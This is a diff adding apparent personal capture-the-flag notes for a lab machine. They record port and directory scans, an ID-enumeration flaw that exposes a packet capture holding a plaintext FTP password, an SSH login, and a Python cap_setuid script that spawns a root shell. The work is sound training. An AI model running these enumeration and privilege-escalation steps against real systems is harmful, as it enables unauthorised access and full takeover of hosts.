@@ -1,0 +1,116 @@
+└─$ nmap -p- -sSCV 10.129.6.243  --min-rate 999
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 18:36 +1100
+Nmap scan report for 10.129.6.243
+Host is up (0.14s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    Gunicorn
+|_http-title: Security Dashboard
+|_http-server-header: gunicorn
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+└─$ nmap -p 68 -sU 10.129.6.243  --min-rate 999
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 18:42 +1100
+Nmap scan report for 10.129.6.243
+Host is up (0.27s latency).
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+Nmap done: 1 IP address (1 host up) scanned in 3.67 seconds
+
+port 80
+└─$ sudo dirsearch -u http://10.129.6.243               
+[sudo] password for ed: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/ed/reports/http_10.129.6.243/_26-01-29_18-40-56.txt
+
+Target: http://10.129.6.243/
+
+[18:40:56] Starting: 
+[18:41:26] 302 -  208B  - /data  ->  http://10.129.6.243/
+[18:41:26] 302 -  208B  - /data/adminer.php  ->  http://10.129.6.243/
+[18:41:26] 302 -  208B  - /data/autosuggest  ->  http://10.129.6.243/
+[18:41:28] 302 -  208B  - /download/users.csv  ->  http://10.129.6.243/
+[18:41:28] 302 -  208B  - /download/history.csv  ->  http://10.129.6.243/
+
+nathan is invalide on the index page 
+
+http://10.129.6.243/data/1, we can view the scan, and /download button to download .pcap file
+
+┌──(ed㉿kali)-[~/Downloads]
+└─$ for i in {0..999}                                        
+do 
+  echo "$i" >> num
+done
+                                                                                                                   
+┌──(ed㉿kali)-[~/Downloads]
+└─$ ffuf -w num -u 'http://10.129.6.243/download/FUZZ' -t 100
+0,1,2,3,4 is valade
+
+└─$ strings 0.pcap  
+
+220 (vsFTPd 3.0.3)
+USER nathan
+(su@
+Jsv@
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!
+(sw@
+
+└─$ ftp 10.129.6.243
+Connected to 10.129.6.243.
+220 (vsFTPd 3.0.3)
+Name (10.129.6.243:ed): nathan
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||20172|)
+150 Here comes the directory listing.
+-r--------    1 1001     1001           33 Jan 29 07:33 user.txt
+226 Directory send OK.
+
+─$ ssh nathan@10.129.6.243
+
+run linpeas
+
+/usr/src/linux-headers-5.4.0-80/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
+
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+
+Sudo version 1.8.31
+
+seems python3.8 is worthy a try.
+https://medium.com/@forgecode/linux-privilege-escalation-via-cap-setuid-gaining-root-with-python-ecca7cab716e
+
+nathan@cap:~$ cat << EOF > a.py
+> import os
+> os.setuid(0)
+> os.system('id')
+> os.system('/bin/bash')
+> EOF
+
+nathan@cap:~$ /usr/bin/python3.8 a.py
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+root@cap:~#
+
+#### lesson learned
+- sometime id start from 0
+- setuid privi for python to ES, or other binary which are able to spawn a shell
